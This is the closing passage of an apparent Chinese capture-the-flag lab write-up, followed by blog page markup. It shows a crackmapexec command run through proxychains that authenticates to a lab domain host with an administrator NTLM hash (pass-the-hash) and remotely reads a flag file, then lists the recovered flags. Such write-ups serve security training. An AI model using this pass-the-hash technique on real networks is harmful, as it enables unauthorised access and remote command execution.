<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">proxychains4 crackmapexec smb <span class="token number">172.22</span>.1.2 <span class="token parameter variable">-u</span> administrator <span class="token parameter variable">-H10cf89a850fb1cdbe6bb432b859164c8</span> <span class="token parameter variable">-d</span> xiaorang.lab <span class="token parameter variable">-x</span> <span class="token string">"type Users\Administrator<span class="token entity" title="\f">\f</span>lag<span class="token entity" title="\f">\f</span>lag03.txt"</span>
<span class="token comment"># -d指定域登录，-x要执行的命令</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><img src="/blog/2025/02/24/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/image-20250224132226932.png" alt="image-20250224132226932"></p>
<p>flag03: <code>e8f88d0d43d6&#125;</code></p>
<p>flag：<code>flag&#123;60b53231-2ce3-4813-87d4-e8f88d0d43d6&#125;</code></p>
<p>花了两小时打完，有点累，但是挺爽的</p>

    </div>
    
    
    
    
    
    
    
</div>

            </div>
        </transition>
        
        <transition name="fade">
            <div id="preview" ref="preview" v-show="previewShow">
                <img id="preview-content" ref="previewContent" />
            </div>
        </transition>
        
    </div>
    <script src="/blog/js/main.js"></script>
    
    




    
    

<div id="vcomments"></div>

<script src="/blog/js/lib/valine.min.js"></script>
<script>
    new Valine({
        el: '#vcomments',
        app_id: 'U9mZLKunkRUTcBFthjXPjnZE-9Nh9j0Va',
        app_key: 'SzWOnY0PWLGNuL6jW8TZYc7j',
        visitor: 'true',
        placeholder: '写点什么吧(●ˇ∀ˇ●)',
        serverURLs: 'https://u9mzlkun.lc-cn-n1-shared.com',
    });
</script>

    <footer id="footer">
    <div id="footer-wrap">
        <div>
            &copy;
            2022 - 2025 雲流のLowest World
            <span id="footer-icon">
                <i class="fa-solid fa-font-awesome fa-fw"></i>
            </span>
            &commat;C1oudfL0w0
        </div>
        <div>
            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
            <a target="_blank" rel="noopener" href="https://github.com/argvchs/hexo-theme-particlex">ParticleX Theme</a>
        </div>
        
    </div>
</footer>

<script src="/blog/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/blog/live2dw/assets/z16.model.json"},"display":{"position":"left","width":150,"height":290},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>

</html>